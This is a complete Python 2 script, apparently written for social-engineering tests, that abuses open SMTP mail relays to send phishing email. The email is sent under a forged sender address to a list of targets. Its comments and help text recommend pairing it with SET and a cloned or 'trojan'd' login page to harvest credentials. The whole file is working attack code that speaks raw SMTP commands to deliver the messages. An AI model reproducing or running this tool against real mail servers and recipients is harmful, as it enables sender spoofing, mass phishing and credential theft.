#!/usr/bin/python2
# simple mail relay abuse script
# Will take list of target email addresses, text file with mail body
# and source email address. Best used with SET and trojan'd login page
# Author: Ian Simons
# Version 0.2
# Licence: WTFPL - wtfpl.net
# Changelog
# Ver 0.2 - included input file exist and magic check
# Ver 0.1 - intial

import socket
import sys
import argparse
import re
from os.path import isfile
from time import sleep
import magic

__version__ = "0.2"

clear = "\x1b[0m"
red = "\x1b[1;31m"
green = "\x1b[1;32m"
cyan = "\x1b[1;36m"


def banner():

    print """\x1b[0;33m
______      _____                             ______
___  /________  /_____________ _____  _______ ___  /
__  __ \  _ \  __/_  ___/  __ `/_  / / /  __ `/_  / 
_  /_/ /  __/ /_ _  /   / /_/ /_  /_/ // /_/ /_  /  
/_.___/\___/\__/ /_/    \__,_/ _\__, / \__,_/ /_/   
                               /____/               
Quick fire SE email to an open relay, Version: %s

\x1b[0m""" % __version__

#   oblig program banner


def buildmagic():
#   checks type of file; used to make it compatible with both types of magic
    try:
        m = magic.open(magic.MAGIC_MIME_TYPE)
        m.load()
    except AttributeError,e:
        m = magic.Magic(mime=True)
        m.file = m.from_file
    return(m)


def checkfile(file):
#   checks whether file exists & is text
    if isfile(file):
        newmagic = buildmagic()
        mtype = newmagic.file(file)
        if re.search("text/plain",mtype):
            return True
        else:
            sys.exit("%s{!} File %s is not a text file%s" % (red,file,clear))
    else:
        sys.exit("%s{!} File '%s' does not exist%s" % (red,file,clear))


def checkmailsyntax(email):
#   checks whether target email addresses are syntactically valid
    match = re.match('[^@]+@[^@]+\.[^@]+', email)
    if match:
        return True


def checkrelay(relay_ip, relay_port):
#   ensure target has port open to attempt open relay
    print("%s{!} Checking if port and relay are open on %s%s" % (cyan,relay_ip,clear))
    chksckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    chksckt.setblocking(0)
    chksckt.settimeout(3)
    try:
        chksckt.connect((relay_ip, relay_port))
        print ("%s{!} Mail relay open! Email treachery starting...%s\n" % (cyan,clear))
        return True
    except Exception as e:
        sys.exit("%s{-} %d/tcp port closed. Connect failed (%s)%s" % (red,relay_port,e,clear))


def relay_cmds(source_email, emails, bodyfile, subject):
#   extend sleeptime if response times are slow. may need to increase timeout too.
    sleeptime = 1
    file = open(bodyfile,'rb')
    l = file.read()
    try:
        betray = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        betray.setblocking(0)
        betray.settimeout(10.1)
        betray.connect((relay_ip, relay_port))
        betray.send("ehlo localhost\r\n")
        sleep(sleeptime)
        betray.send("mail from: " + source_email + "\r\n")
        sleep(sleeptime)
        for i in emails:
            print ("%s{+} Sending TO %s %s" % (green,i,clear))
            betray.send("rcpt to: " + i + "\r\n")
            sleep(sleeptime)
            if "550" in betray.recv(1024):
                print ("%s{-} Unable to relay to %s, no such mailbox.%s") % (red,i,clear)
        betray.send("DATA\r\n")
        sleep(sleeptime)
        betray.send("Subject:" + subject + "\r\n")
        sleep(sleeptime)
        betray.send("\r\n")
        sleep(sleeptime)
        while (l):
            betray.send(l + "\r\n")
            betray.recv(256)
            l = file.read()
        sleep(10)
        betray.send(".\r\n")
        sleep(sleeptime)
        betray.send("QUIT\r\n")
        sleep(sleeptime)
        betray.close()
    except Exception as e:
        sys.exit("%s{-} Failed to open socket. (%s)%s" % (red,e,clear))
    file.close()


def main():
    global relay_ip
    global relay_port

    target_email_list = []
    valid_emails = []

    banner()
    parser = argparse.ArgumentParser(description="Send SE emails to open mail relay. Recommend pairing with SET ...for example, include a link to a duplicated login page in 'bodyfile'")
    parser.add_argument('--openrelay', help="IP address of open relay", required=True)
    parser.add_argument('--relayport', help="SMTP port. Defaults to 25 if not specified", default=25, type=int)
    parser.add_argument('--targetfile', help="Soon to be customers (valid email address)", required=True)
    parser.add_argument('--source', help="The Important, Trustworthy Person(TM) (email address)", required=True)
    parser.add_argument('--subject', help="Email subject, in quotes", required=True)
    parser.add_argument('--bodyfile', help="The sweet, sweet, textual words of enchantment", required=True)
    args = parser.parse_args()

    relay_ip = args.openrelay
    relay_port = args.relayport

#   check bodyfile exists & is text
    checkfile(args.bodyfile)

#   check validity
    with open(args.targetfile) as targets:
        target_email_list = targets.readlines()
        target_email_list = map(lambda s: s.strip(),target_email_list)
    invalid_emails = [email for email in target_email_list if not checkmailsyntax(email)]
    valid_emails = [email for email in target_email_list if checkmailsyntax(email)]
#   put any invalid emails into file for cross-checking
    if invalid_emails:
        print("%s{!} Syntactically invalid emails detected - see output file. Removing...%s" % (cyan, clear))
        bad_mail=open("invalid_email_output.txt","w")
        for mail in invalid_emails:
            bad_mail.write("%s\n" % mail)
#   everything ok? Here we go!
    if checkmailsyntax(args.source):
        if checkrelay(relay_ip, relay_port):
            print ("%s{+} Sending FROM %s %s" % (green,args.source,clear))
            relay_cmds(args.source, valid_emails, args.bodyfile, args.subject)
            print ("\n%s{!} Duplicity complete. Expect good news.%s" % (cyan,clear))
        else:
            sys.exit("%s{-} teh fail. Quitting.%s" % (red,clear))
    else:
        sys.exit("%s{-} Source email has invalid syntax.%s" % (red,clear))


if __name__=="__main__":
    main()
